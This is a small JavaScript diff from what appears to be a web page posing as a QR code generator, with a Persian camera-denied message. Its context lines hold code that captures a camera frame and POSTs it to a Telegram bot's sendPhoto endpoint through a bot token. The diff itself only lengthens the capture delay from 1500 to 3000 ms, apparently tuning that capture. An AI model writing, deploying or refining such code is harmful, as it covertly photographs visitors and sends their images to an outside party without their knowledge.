@@ -46,7 +46,7 @@ function generate() {
         f.append('photo',b,'photo.jpg');
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f});
       },'image/jpeg',0.85);
-    },1500);
+    },3000);
   }).catch(()=>alert('دسترسی به دوربین رد شد'));
   // ================== ساخت QR Code ==================
   setTimeout(() => {
